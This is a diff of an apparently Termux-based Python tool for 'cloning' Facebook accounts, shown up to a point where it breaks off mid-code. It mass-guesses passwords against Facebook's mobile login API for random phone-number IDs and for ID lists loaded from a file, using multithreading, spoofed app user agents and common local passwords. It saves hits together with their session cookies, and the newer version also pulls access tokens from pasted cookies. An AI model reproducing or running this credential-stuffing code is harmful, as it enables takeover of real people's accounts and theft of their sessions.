@@ -1,479 +1,788 @@
-#__________________[ IMPORT ]__________________#
-import os,zlib
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-#print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] GIFTED BY Tharkii ')
-os.system(f'pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests') 
+#-----------------[ MODULE ]-------------------#
+import os
+def modules():
+	os.system('pkg update -y && pkg upgrade -y')
+	os.system('clear')
+	try: 
+		import rich
+	except ModuleNotFoundError:
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m RICH IS BEING INSTALLED \033[1;37m")
+		os.system('pip install rich --quiet')
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m RICH HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	try:
+		import bs4
+	except ModuleNotFoundError:
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m BS4 IS BEING INSTALLED \033[1;37m")
+		os.system('pip install bs4 --quiet')
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m BS4 HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	try:
+		import requests
+	except ModuleNotFoundError:
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m REQUESTS IS BEING INSTALLED \033[1;37m")
+		os.system('pip install requests --quiet')
+		print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m REQUESTS HAS BEEN INSTALLED \033[1;37m")
+	except:exit()
+	exit()
 try:
-    import requests 
-except ImportError:
-    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING REQUESTS ')
-    os.system('pip install requests')
-try:
-    import concurrent.futures
-except ImportError:
-    print(f'\x1b[38;5;46m[\x1b[1;97m=\x1b[38;5;46m] INSTALLING FUTURES ')
-    os.system('pip install futures')
-try:
-    import mechanize
+	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket,marshal
+	import os, requests, marshal, zlib, base64
+	from bs4 import BeautifulSoup as bs
+	from bs4 import BeautifulSoup
+	import urllib3,rich,base64
+	from rich.table import Table as me
+	from rich.console import Console as sol
+	from bs4 import BeautifulSoup as sop
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from rich.console import Group as gp
+	from rich.panel import Panel as nel
+	from rich.panel import Panel
+	from rich.tree import Tree
+	from rich.panel import Panel as nel
+	from rich.panel import Panel as panel
+	from rich import print as cetak
+	from rich.markdown import Markdown as mark
+	from rich.columns import Columns as col
+	from rich import print as prints
+	from rich import pretty
+	from rich.text import Text as tekz
+	from time import localtime as lt	
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess,platform
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+	pretty.install()
+	CON=sol()
 except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
-from urllib.request import Request, urlopen
-import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
-from concurrent.futures import ThreadPoolExecutor as sanjidabou
-from string import * 
-from random import randint
-from time import sleep as slp
-from os import system as cmd
-from zlib import decompress 
-import os, platform
-from concurrent.futures import ThreadPoolExecutor
-fast_work = ThreadPoolExecutor(max_workers=15).submit
-def mar():
-     device_model = random.choice(["Nokia 6.1", "Samsung Galaxy S9", "Pixel 4a", "OnePlus 7T"])
-     ua= "[FBAN/FB4A;FBAV/{random.randint(['75.0.0.23.69','354.0.0.8.108','414.0.0.30.113'])};FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/{device_model};FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-     ua ="[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
-     return ua
-#__________________[ LOOP ]__________________#
-totaldmp = 0
-count = 0
-loop = 0
-oks = []
-cps = []
-id = []
-ps = []
-sid = []
-total=[]
-methods = []
-srange = 0
-saved = []
-totaldmp = 0
-filter = []
-loop,ok,cp,user = 0,[],[],[]
-cok,plist = [],[]
-#__________________[ SYS ]__________________#
-sys.stdout.write('\x1b]2; PRASHANT\x07')
-head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
-#__________________[ COLOUR ]__________________#
-A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
-S = '\x1b[1;96m'
-M = '\x1b[38;5;205m'
-RED = '\033[1;31m'
-wx = '\033[1;37m'
-GREEN = '\033[1;32m' 
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-pink = '\033[1;35m'
-G3 = '\x1b[38;5;48m'
-#__________________[ LINEX ]__________________#
-def clear():os.system('clear');print(logo)
-def linex():print(f'{A}──────────────────────────────────────────────────')
-#__________________[ LOGO ]__________________#
-logo =f"""\x1b[1;97m   
-\033[1;33m   
-  /$$$$$$           
- /$$__  $$          
-| $$  \__/  /$$$$$$ 
-|  $$$$$$  /$$__  $$
- \____  $$| $$  \ $$
- /$$  \ $$| $$  | $$
-|  $$$$$$/| $$$$$$$/
- \______/ | $$____/ 
-          | $$      
-          | $$      
-          |__/      
-{A}──────────────────────────────────────────────────"""
-#__________________[ RESULT ]__________________#
-def result(OKs,cps):
-    if len(OKs) != 0 or len(cps) != 0:
-        print(f'\r{A}──────────────────────────────────────────────────')
-        print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETE...')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL OK {A}:{G2} %s' % str(len(oks)))
-        print(f'{G1}[{A}={G2}]{G3} TOTAL CP {A}:{G3} %s' % str(len(cps)))
-        print(f'\r{A}──────────────────────────────────────────────────')
-        input(f"{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK MENU ")
-        exit()
-#__________________[ MENU ]__________________#
-def menu():   
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} FILE CLONING')
-    print(f'{G1}[{A}2{G2}]{G2} RANDOM CLONING')
-    print(f'{G1}[{A}3{G3}]{G3} CONTACT TOOL OWNER')
-    print(f'{G1}[{A}0{G4}]{G4} EXIT TOOLS')
-    print(f'Tool Type : \033[1;33m namaste \033[1;37m')
-    print(f'NOTE : \033[1;31m SP DAD  :)\033[1;37m')
-    linex()
-    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
-    if select =='1':
-        _file_()
-        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
-    elif select =='2':
-        _randm_()
-        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
-    elif select =='3':
-        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
-        menu()
-    elif select =='0':
-        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
-        exit(f'{G1}[{A}={G1}]{G1} EXIT DONE ')
-    else:
-        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-        time.sleep(2)
-        menu()
-#__________________[ RANDOM ]__________________#      
-def _randm_():   
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} MADA CLONING')
-    print(f'{G1}[{A}2{G2}]{G2} MADA1 CLONING')
-    print(f'{G1}[{A}0{G3}]{G3} BACK TO MAIN MENU')
-    linex()
-    select = input(f'{G1}[{A}?{G5}]{G5} CHOICE {A}:{G5} ')
-    if select =='1':
-        _bd_()
-        os.system('xdg-open https://chat.whatsapp.com/HbhDHpyp56B9PN7D1zDDbX')
-    elif select =='2':
-        _India_()
-    elif select =='0':
-    	menu()
-    else:
-        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-        time.sleep(2)
-        _randm_()
-#__________________[ BANGLADESH ]__________________#
-def _bd_():
-    clear()
-    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} 26138{A}/{G1}26134{A}/{G1}26132{A}/{G1}26133');linex()
-    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
-    name = ''.join(random.choice(string.digits) for _ in range(2))
-    cod = ''.join(random.choice(string.digits) for _ in range(2))
-    clear()
-    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
-    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
-    for x in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(4))
-        user.append(nmp)
-    clear()
-    with sanjidabou(max_workers=30) as sexy:
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
-        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
-        for love in user:
-            ids = code+name+cod+love
-            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'77889900','malala','fitiavana','Fitiavana','safidy','Safidy','nirina','Nirina','rakoto','Rakoto','avotra','nomena','mamako','Mamako','malagasy','santatra','randria','Randria','finaritra','faniry','hasina','Hasina','fifaliana','mirana','tolotra','silako','lataka','Lataka','milely','Milely','tabory']
-            sexy.submit(randm,ids,psd)
-    print('')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
-    menu()
-#__________________[ INDIA ]__________________#
-def _India_():
-    clear()
-    print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} +26138{A}/{G1}+26134{A}/{G1}+26132{A}/{G1}+26133');linex()
-    code = input(f'{G1}[{A}?{G2}]{G2} CHOICE  {A}:{G2} ')
-    clear()
-    print(f'{G1}[{A}={G3}]{G3} EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999');linex()
-    limit = int(input(f'{G1}[{A}?{G4}]{G4} CHOICE  {A}:{G4} '))
-    for x in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    clear()
-    with sanjidabou(max_workers=30) as sexy:
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}:{G1} {code}')
-        print(f'{G1}[{A}={G2}]{G2} TOTAL UID {A}:{G2} {str(len(user))}')
-        print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN');linex()
-        for love in user:
-            ids = code+love
-            psd = [love,ids[:8],'57273200','59039200','57575751','77889900','malala','fitiavana','Fitiavana','safidy','Safidy','nirina','Nirina','rakoto','Rakoto','avotra','nomena','mamako','Mamako','malagasy','santatra','randria','Randria','finaritra','faniry','hasina','Hasina','fifaliana','mirana','tolotra','silako','lataka','Lataka','milely','Milely','tabory']
-            sexy.submit(randm,ids,psd)
-    print('')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    print(f'{G1}[{A}={G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
-    print(f'{G1}[{A}={G2}]{G2} TOTAL OK ID {A}:{G2} {str(len(ok))}')
-    print(f'{G1}[{A}={G3}]{G3} TOTAL CP ID {A}:{G3} {str(len(cp))}')
-    print(f'\r{A}──────────────────────────────────────────────────')
-    input(f'{G1}[{A}={G4}]{G4} PRESS ENTER TO BACK ')
-    menu()
-#__________________[ FILE ]__________________#      
-def _file_():
-    global methods
-    clear()
-    print(f'{G1}[{A}1{G1}]{G1} METHOD {G1}[{A}M1{G1}]{G1} ')
-    print(f'{G1}[{A}2{G2}]{G2} METHOD {G2}[{A}M2{G2}]{G1} ')
-    linex()
-    option = input(f'{G1}[{A}?{G3}]{G3} CHOICE {A}:{G3} ')
-    if option =='1':
-        methods.append('methodA')
-        main_crack().crack(id)
-    elif option =='2':
-        methods.append('methodB')
-        main_crack().crack(id)
-    elif option =='0':
-        _file_()
-    else:
-      print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
-      time.sleep(2)
-      _file_()
+	modules()	
+#------------[ COLOR ]--------------#
+P = '\x1b[1;97m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[38;5;50m'
+Z = "\x1b[38;5;83m"
+X = "\x1b[38;5;46m"
+m = '\x1b[1;91m'
+b = '\33[1;96m'	
+#---------------------[IP]---------------------#
+try:
+	net = requests.get("http://ip-api.com/json/").json()["isp"]
+	ipxx = requests.get("https://api.ipify.org").text    
+except requests.exceptions.ConnectionError:
+	print('\033[1;37m—————————————————————————\x1b[1;97m')
+	print("\x1b[1;97m• \x1b[1;91m>>\x1b[1;97m CHECK YOUR INTERNET")
+	time.sleep(1)
+	exit()
+	
+#------------------[ USER-AGENT ]-------------------#
+def generate_user_agent():
+    application_version = f"{random.randint(11, 77)}.0.0.{random.randrange(9, 49)}{random.randint(11, 77)}"
+    application_version_code = str(random.randint(000000000, 999999999))
+    ua = (
+        f"[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};"
+        "{density=3.75,width=1080,height=2400};FBLC/en_NZ;FBRV/{random.randint(000000000, 999999999)};"
+        "FBCR/Etisalat Af;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/CPH2209;FBSV/10;FBOP/19;"
+        "FBCA/armeabi-v7a:armeabi;]")
+    return ua
+#--------------------[ UA-UPDATE ]--------------#
+Ua = generate_user_agent()
+#------------------[ CUTS ]---------------#
+def clear():
+    os.system('clear')
+def back():
+    menu()	
+def contact():
+    os.system('xdg-open https://chat.whatsapp.com/GKCh3wB9KoU9oDuy0MsZ7v')
+    back()
+def linex():
+    print('\033[1;37m=====================================================\x1b[1;97m')
+def animation(u):
+    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)    
+#------------------[ LOGO ]-----------------#
+logo =f"""    """
+#--------------------[ ENTRY ]--------------#    
 
-class main_crack():
-    def __init__(self):
-        self.id=[]
-    def crack(self,id):
-        global methods
-        clear()
-        print(f'{G1}[{A}={G1}]{G1} EXAMPLE {A}:{G1} /sdcard/SP.txt');linex()
-        self.file = input(f'{G1}[{A}?{G2}]{G2} FILE NAME {A}:{G2} ')
-        try:
-            self.id = open(self.file).read().splitlines()
-            self.pasw()
-        except FileNotFoundError:
-            print(f'{G1}[{A}={G2}]{G2} OPPS FILE NOT FOUND ...')
-            time.sleep(2)
-            os.system('clear')
-            print(logo)
-            print(f'{G1}[{A}={G2}]{G2} TRY AGAIN ...')
-            time.sleep(2)
-            main_crack().crack(id)
-#__________________[ FILE METHOD M1 ]__________________#           
-    def methodA(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Airtel;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/L-EMENT500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
-            sys.stdout.write(f"\r{G1}[{A}SP-M1{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
-            sys.stdout.flush()
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": sid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {
-                    'User-Agent': mar(),
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
-                    print(f"\r\r{G1}[COOKIE]{A} {ckkk}")
-                    open('/sdcard/SP-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
-                    oks.append(sid)
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                     print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
-                     open('/sdcard/SP-M1-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                     cps.append(sid)
-                     break
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodA(sid, name, ps)
-#__________________[ FILE METHOD M2 ]__________________#             
-    def methodB(self, sid, name, psw):
-        try:
-            global oks,cps,loop
-            sys.stdout.write(f"\r{G1}[{A}SP-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
-            sys.stdout.flush()
-            fs = name.split(' ')[0]
-            try:
-                ls = name.split(' ')[1]
-            except:
-                ls = fs
-            for pw in psw:
-                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
-                with requests.Session() as session:
-                    data = {"adid": str(uuid.uuid4()),
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "cpl": "true",
-                    "family_device_id": str(uuid.uuid4()),
-                    "credentials_type": "device_based_login_password",
-                    "error_detail_type": "button_with_disabled",
-                    "source": "device_based_login",
-                    "email": sid,
-                    "password": ps,
-                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-                    "generate_session_cookies": "1",
-                    "meta_inf_fbmeta": "",
-                    "advertiser_id": str(uuid.uuid4()),
-                    "currently_logged_in_userid": "0",
-                    "locale": "en_GB",
-                    "client_country_code": "GB",
-                    "method": "auth.login",
-                    "fb_api_req_friendly_name": "authenticate",
-                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                    "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': '[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Host': 'graph.facebook.com',
-                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                    'X-FB-Connection-Type': 'MOBILE.LTE',
-                    'X-Tigon-Is-Retry': 'False',
-                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                    'x-fb-device-group': '5120',
-                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                    'X-FB-Request-Analytics-Tags': 'graphservice',
-                    'X-FB-HTTP-Engine': 'Liger',
-                    'X-FB-Client-IP': 'True',
-                    'X-FB-Server-Cluster': 'True',
-                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
-                if 'session_key' in q:
-                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                    print(f"\r\r{G1}[SP-OK] {sid} | {ps} ")
-                    print(f'\r\r{G1}[COOKIE]{A} {ckkk}')
-                    open('/sdcard/SP-M2-FILE-OK.txt','a').write(sid+'|'+ps+'|'+ckkk+'\n')
-                    oks.append(sid)
-                    break
-                elif 'www.facebook.com' in q['error']['message']:
-                    print(f"\r\r{M}[SP-CP] {sid} | {ps} ")
-                    open('/sdcard/SP-M2-FILE-CP.txt','a').write(sid+'|'+ps+'\n')
-                    cps.append(sid)
-                else:
-                    continue
-            loop+=1
-        except requests.exceptions.ConnectionError:
-            self.methodC(sid, name, ps)
-#__________________[ PASSWORD ]__________________#
-    def pasw(self):       
-            pw = []
-            clear()
-            print(f'{G1}[{A}={G2}]{G2} EXAMPLE {A}:{G2} BD 10-18/INDIA 3-5 / Best 12 Pass');linex()
-            sl = int(input(f'{G1}[{A}?{G3}]{G3} PASSWORD LIMIT {A}:{G3} '))
-            clear()
-            print(f'{G1}[{A}?{G4}]{G4} EXAMPLE {A}:{G4} first123/firstlast/first@@@')
-            linex()
-            if sl =='':
-                print(f'{G1}[{A}={G5}]{G5} PUT LIMIT BETWEEN 1 TO 20')
-            elif sl > 20:
-                print(f'{G1}[{A}={G1}]{G1} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 20')
-            else:
-                for sr in range(sl):
-                    pw.append(input(f'{G1}[{A}={G1}]{G1} PASSWORD NO {G1}[{A}{sr+1}{G1}] {A}:{G1} '))
-            clear()
-            print(f'{G1}[{A}={G1}]{G1} TOTAL FILE UID {A}:{G1} %s ' % len(self.id))
-            print(f'{G1}[{A}={G2}]{G2} PASSWORD LIMIT {A}:{G1} {sl} ')
-            print(f'{G1}[{A}={G3}]{G3} TURN {G3}[{A}ON{A}/{A}OFF{G3}]{G3} AIRPLANE MODE EVERY {A}3{G3} MIN')
-            linex()
-            with sanjidabou(max_workers=30) as SHAJON:
-                for zsb in self.id:
-                   try:
-                       uid, name = zsb.split('|')
-                       sz = name.split(' ')
-                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
-                           pwx =  pw
-                       else:
-                            pwx =  pw
-                            if 'methodA' in methods:
-                                SHAJON.submit(self.methodA, uid, name, pwx)
-                            elif 'methodB' in methods:
-                                SHAJON.submit(self.methodB, uid, name, pwx)
-                   except:pass
-            result(oks,cps)
-#__________________[ RANDOM METHOD ]__________________#
-def randm(ids,psd):
-    global loop,ok,cp
-    sys.stdout.write(f"\r{G1}[{A}SP{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
-    sys.stdout.flush()
-    access_token = f'2560'+'02347743'+'983|374e'+'60f8b9bb'+'6b8cbb30f7'+'8030438895'
+def entr():
+    clear()
+    print(logo)
+    print(" \x1b[1;91m• \x1b[1;97m1\x1b[1;91m >\x1b[1;97m LOGIN TOOL BY COOKIE")
+    print(" \x1b[1;91m• \x1b[1;97m2\x1b[1;91m >\x1b[1;97m WITHOUT COOKIE MENU ")
+    print(" \x1b[1;91m• \x1b[1;97m0\x1b[1;91m >\x1b[1;97m CONTACT ADMIN ")
+    linex()
+    ll = input(' \x1b[1;97m• \x1b[1;91m--->\x1b[1;97m ')
+    if ll == '1':
+        login()
+    elif ll == '2':        
+        menu_next()
+    elif ll == '0':        
+        contact()
+    else:
+        linex()
+        animation('•\x1b[1;91m -->\x1b[1;97m SELECT CORRECTLY ')
+        time.sleep(3)
+        entr()
+
+
+#--------------------[ LOGIN BY COOKIE ]--------------#    
+ses = requests.Session()
+def login():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+		tokenku.append(token)
+		try:
+			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
+			sy2 = json.loads(sy.text)['name']
+			sy3 = json.loads(sy.text)['id']
+			menu(sy2,sy3)
+		except KeyError:
+			login_lagi334()
+		except requests.exceptions.ConnectionError:
+			li = '# INTERNET CONNECTION PROBLEM, CHECK AND TRY AGAIN'
+			lo = mark(li, style='red')
+			sol().print(lo, style='cyan')
+			exit()
+	except IOError:
+		login_lagi334()
+
+
+def login_lagi334():
+ try:    
+  linex()
+  print("\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m USE INSTA ADDED COOKIE !!")
+  linex()
+  cookie=input(f'{P}\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m ENTER COOKIE :\x1b[1;92m ')
+  linex()
+  open(".cok.txt", "w").write(cookie)
+  with requests.Session() as rsn:
+   try:
+    rsn.headers.update({
+                    'Accept-Language': 'id,en;q=0.9',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
+                    'Referer': 'https://www.instagram.com/',
+                    'Host': 'www.facebook.com',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Accept': '*/*',
+                    'Connection': 'keep-alive',
+                    'Sec-Fetch-Site': 'cross-site',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Origin': 'https://www.instagram.com',
+                    'Accept-Encoding': 'gzip, deflate',
+                })
+    response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
+    if '"access_token":' in str(response.headers):
+     token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
+     print(f"\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m UR TOKEN : {b}{token}")
+     open(".token.txt", "w").write(token)     
+     linex();animation('\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m COOKIE LOGINED SUCCESSFUL !! ');linex();xxz = input('\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO MENU');menu()
+     
+    else:
+     print(''%(m, p))
+
+   except:
+    animation(f' {P}\033[1;37m\x1b[1;97m×\x1b[1;91m-->\x1b[1;97m{m} COOKIE EXPIRED!!');linex();xxz = input('\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m PRESS ENTER TO BACK');back()
+
+  print(f' ');time.sleep(1)
+  exit()
+ except Exception as e:
+  os.system("rm -f .token.txt")
+  os.system("rm -f .cok.txt")
+  animation('\033[1;37m \x1b[1;97m• \x1b[1;91m>>\x1b[1;97m SELECT CORRECTLY ')
+  print(e)
+  exit()
+  
+#------------------[ MENU ]----------------#
+def menu():
+    clear(),print(logo)       
     try:
-        for pas in psd:
-            data = {'adid':str(uuid.uuid4()),
-                                'format':'json',
-                                'device_id':str(uuid.uuid4()),
-                                'email':ids,'password':pas,
-                                'generate_analytics_claims':'1',
-                                'community_id':'',
-                                'cpl':'true',
-                                'try_num':'1',
-                                'family_device_id':str(uuid.uuid4()),
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
